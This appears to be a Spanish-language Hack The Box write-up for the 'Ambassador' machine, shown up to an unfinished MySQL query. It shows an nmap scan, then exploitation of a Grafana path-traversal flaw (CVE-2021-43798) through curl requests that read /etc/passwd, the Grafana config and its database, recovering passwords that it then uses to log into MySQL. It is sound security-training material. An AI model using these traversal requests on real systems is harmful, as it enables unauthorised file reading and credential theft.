<!doctype html><html lang="es"><head><title>Ambassador | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una instancia de Grafana que es vulnerable a Directory Path Traversal sin autenticación. Así, podemos leer archivos del servidor y encontrar la contraseña para Grafana y para MySQL. Después de eso, podemos conectarnos a MySQL, que está expuesto, y encontrar otra contraseña para acceder a través de SSH. La máquina ejecuta consul internamente con una configuración vulnerable. Después de encontrar un token de autenticación en un repositorio de Git, podemos usar un exploit para obtener RCE en consul y ganar acceso como root"><meta name="image" content="https://7rocky.github.io/images/HTB/Ambassador/Ambassador.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una instancia de Grafana que es vulnerable a Directory Path Traversal sin autenticación. Así, podemos leer archivos del servidor y encontrar la contraseña para Grafana y para MySQL. Después de eso, podemos conectarnos a MySQL, que está expuesto, y encontrar otra contraseña para acceder a través de SSH. La máquina ejecuta consul internamente con una configuración vulnerable. Después de encontrar un token de autenticación en un repositorio de Git, podemos usar un exploit para obtener RCE en consul y ganar acceso como root"><meta itemprop="keywords" content="git,cve,port-forwarding,directory-path-traversal,rce,"><meta itemprop="name" content="Ambassador"><meta property="article:published_time" content="2023-01-28T00:00:00+00:00"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una instancia de Grafana que es vulnerable a Directory Path Traversal sin autenticación. Así, podemos leer archivos del servidor y encontrar la contraseña para Grafana y para MySQL. Después de eso, podemos conectarnos a MySQL, que está expuesto, y encontrar otra contraseña para acceder a través de SSH. La máquina ejecuta consul internamente con una configuración vulnerable. Después de encontrar un token de autenticación en un repositorio de Git, podemos usar un exploit para obtener RCE en consul y ganar acceso como root"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Ambassador/Ambassador.webp"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Ambassador"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/ambassador/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una instancia de Grafana que es vulnerable a Directory Path Traversal sin autenticación. Así, podemos leer archivos del servidor y encontrar la contraseña para Grafana y para MySQL. Después de eso, podemos conectarnos a MySQL, que está expuesto, y encontrar otra contraseña para acceder a través de SSH. La máquina ejecuta consul internamente con una configuración vulnerable. Después de encontrar un token de autenticación en un repositorio de Git, podemos usar un exploit para obtener RCE en consul y ganar acceso como root"><meta name="twitter:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una instancia de Grafana que es vulnerable a Directory Path Traversal sin autenticación. Así, podemos leer archivos del servidor y encontrar la contraseña para Grafana y para MySQL. Después de eso, podemos conectarnos a MySQL, que está expuesto, y encontrar otra contraseña para acceder a través de SSH. La máquina ejecuta consul internamente con una configuración vulnerable. Después de encontrar un token de autenticación en un repositorio de Git, podemos usar un exploit para obtener RCE en consul y ganar acceso como root"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Ambassador/Ambassador.webp"><meta name="twitter:title" content="Ambassador"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/htb/ambassador/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/ambassador/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/ambassador/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/ambassador/&amp;text=Ambassador" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/ambassador/&amp;title=Ambassador" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Ambassador</h1><time class="mt4 f6 dib tracked" datetime="2023-01-28T00:00:00+01:00">28 / 01 / 2023</time><br><p class="mb4 f6 dib tracked">11 minutos de lectura</p></header><div class="htb-image"><img alt="Ambassador" src="/images/HTB/Ambassador/Ambassador.webp"><br><div class="htb-description bg-card">Hack The Box. Linux. Máquina media. Esta máquina tiene una instancia de Grafana que es vulnerable a <em>Directory Path Traversal</em> sin autenticación. Así, podemos leer archivos del servidor y encontrar la contraseña para Grafana y para MySQL. Después de eso, podemos conectarnos a MySQL, que está expuesto, y encontrar otra contraseña para acceder a través de SSH. La máquina ejecuta <code>consul</code> internamente con una configuración vulnerable. Después de encontrar un <em>token</em> de autenticación en un repositorio de Git, podemos usar un <em>exploit</em> para obtener RCE en <code>consul</code> y ganar acceso como <code>root</code></div></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/git" title="Git">Git</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/port-forwarding" title="Reenvío de puertos">Reenvío de puertos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/directory-path-traversal" title="Navegación de directorios">Navegación de directorios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#lectura-de-archivos-del-servidor">Lectura de archivos del servidor</a></li><li><a href="#conexión-a-mysql">Conexión a MySQL</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#enumeración-de-git">Enumeración de Git</a></li><li><a href="#reenvío-de-puertos">Reenvío de puertos</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.183</li><li><strong>Fecha</strong>: 01 / 10 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.183 -p 22,80,3000,3306
Nmap scan report for 10.10.11.183
Host is up (0.067s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ambassador Development Server
|_http-generator: Hugo 0.94.2
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date:
|     Content-Length: 29
|     href="/login">Found&lt;/a&gt;.
|   HTTPOptions:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date:
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info:
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: ODBCClient, LongColumnFlag, InteractiveClient, Speaks41ProtocolNew, FoundRows, LongPassword, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, IgnoreSigpipes, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsCompression, Support41Auth, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults  
|   Status: Autocommit
|   Salt: &^TZ(\x05YqxR\x0EI:f\x03_cqkl
|_  Auth Plugin Name: caching_sha2_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 125.50 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80, 3000 (HTTP) y 3306 (MySQL).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.183</code>, veremos esta página web:</p><p><img alt="Ambassador 1" src="/images/HTB/Ambassador/Ambassador-1.webp"></p><p>Se trata de un <em>blog</em> con el siguiente artículo:</p><p><img alt="Ambassador 2" src="/images/HTB/Ambassador/Ambassador-2.webp"></p><p>Lo único interesante aquí es que tenemos un nombre de usuario (<code>developer</code>).</p><p>En el puerto 3000 tenemos Grafana:</p><p><img alt="Ambassador 3" src="/images/HTB/Ambassador/Ambassador-3.webp"></p><p>Se trata de Grafana v8.2.0, como se muestra en el pie de página. Si buscamos vulnerabilidades, encontramos una que se aplica a esta versión:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">searchsploit</span> grafana
------------------------------------------------------------ ---------------------------  
Exploit Title                                               | Path
------------------------------------------------------------ ---------------------------
<span class="code-red">Grafana</span> 7.0.1 - Denial of Service (PoC)                     | linux/dos/48638.sh
<span class="code-red">Grafana</span> 8.3.0 - Directory Traversal and Arbitrary File Read | multiple/webapps/50581.py
------------------------------------------------------------ ---------------------------
Shellcodes: No Results
</code></pre></div><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Por lo tanto, estaremos explotando <a target="_blank" href="https://nvd.nist.gov/vuln/detail/cve-2021-43798">CVE-2021-43798</a>, que es una vulnerabilidad de <em>Directory Path Traversal</em> sin autenticación en Grafana.</p><h3 id="lectura-de-archivos-del-servidor">Lectura de archivos del servidor</h3><p>Primero, utilizaremos el <a target="_blank" href="https://www.exploit-db.com/exploits/50581">script</a> referenciado por <code>searchploit</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">50581.py</span> -H http://10.10.11.183:3000
Read file &gt; /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
</code></pre></div><p>Funciona, por lo que tenemos la capacidad de leer archivos del servidor siempre que sepamos la ruta completa. En realidad, podemos hacer lo mismo usando <code>curl</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> --path-as-is 10.10.11.183:3000/public/plugins/elasticsearch/../../../../../../../../etc/hosts  
127.0.0.1 localhost
127.0.1.1 ambassador

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre></div><p>Nótese el uso de la opción <code>--path-as-is</code> para prevenir comportamientos extraños de <code>../</code>, como muestra <a target="_blank" href="https://www.youtube.com/watch?v=Cife4ejJGlo">0xdf en este vídeo</a>.</p><p>Si leemos la <a target="_blank" href="https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/">documentación de Grafana</a>, vemos que los archivos de configuración generalmente se almacenan en <code>/etc/grafana/grafana.ini</code> cuando se ha instalado en Linux usando un gestor de paquetes. Podemos descargar el archivo y leer las líneas que importan (las que no están en blanco o comentadas):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> --path-as-is 10.10.11.183:3000/public/plugins/elasticsearch/../../../../../../../../etc/grafana/grafana.ini -so grafana.ini  

<span class="code-cyan">$</span> <span class="code-dark-green">grep</span> -vE <span class="code-dark-yellow">'^;|^#|^\[|^$'</span> <span class="mtku">grafana.ini</span>
admin_password = messageInABottle685427
</code></pre></div><p>Y tenemos una contraseña (en realidad una <a target="_blank" href="https://www.youtube.com/watch?v=mbxwrmqw-oe">canción de The Police</a>). Ahora tenemos acceso a Grafana usando <code>admin:messageInABottle685427</code>:</p><p><img alt="Ambassador 4" src="/images/HTB/Ambassador/Ambassador-4.webp"></p><p>Aquí podemos probar un poco y ver que hay una fuente de datos llamada <code>mysql.yaml</code>, pero nada más:</p><p><img alt="Ambassador 5" src="/images/HTB/Ambassador/Ambassador-5.webp"></p><p>Sería útil obtener la contraseña utilizada para conectarse a MySQL.</p><h3 id="conexión-a-mysql">Conexión a MySQL</h3><p>Podemos continuar explotando la vulnerabilidad de <em>Directory Path Traversal</em> y leer la base de datos SQLite3 utilizada por Grafana almacenada en <code>/var/lib/grafana/grafana.db</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> --path-as-is 10.10.11.183:3000/public/plugins/elasticsearch/../../../../../../../../var/lib/grafana/grafana.db -so grafana.db

<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">grafana.db</span>
grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 512, database pages 161, cookie 0x119, schema 4, UTF-8, version-valid-for 512

<span class="code-cyan">$</span> <span class="code-dark-green">sqlite3</span> <span class="mtku">grafana.db</span>
SQLite version 3.37.0 2021-12-09 01:34:53
Enter ".help" for usage hints.
sqlite&gt; .tables
alert                       login_attempt
alert_configuration         migration_log
alert_instance              ngalert_configuration
alert_notification          org
alert_notification_state    org_user
alert_rule                  playlist
alert_rule_tag              playlist_item
alert_rule_version          plugin_setting
annotation                  preferences
annotation_tag              quota
api_key                     server_lock
cache_data                  session
dashboard                   short_url
dashboard_acl               star
dashboard_provisioning      tag
dashboard_snapshot          team
dashboard_tag               team_member
dashboard_version           temp_user
data_source                 test_data
kv_store                    user
library_element             user_auth
library_element_connection  user_auth_token
sqlite&gt; .header on
sqlite&gt; select * from data_source;
id|org_id|version|type|name|access|url|password|user|database|basic_auth|basic_auth_user|basic_auth_password|is_default|json_data|created|updated|with_credentials|secure_json_data|read_only|uid  
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-10-18 23:09:00|0|{}|1|uKewFgM4z
sqlite&gt; .exit
</code></pre></div><p>Y aquí tenemos la contraseña utilizada para MySQL, que es otra <a target="_blank" href="https://www.youtube.com/watch?v=knizofpb8zm">canción de The Police</a>. Ahora podemos acceder a la instancia de MySQL con este comando:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">mysql</span> --user=grafana --password=dontStandSoCloseToMe63221! --host=10.10.11.183  
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 103
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0,10 sec)
</code></pre></div><p>Hay una base de datos sospechosa llamada <code>whackywidget</code>&mldr; Veamos qué hay dentro:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">mysql&gt; use whackywidget;
Reading table information for completion of table and column names  
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0,10 sec)

mysql&gt; describe users;
+-------+--------------+------+-----+---------+-------+
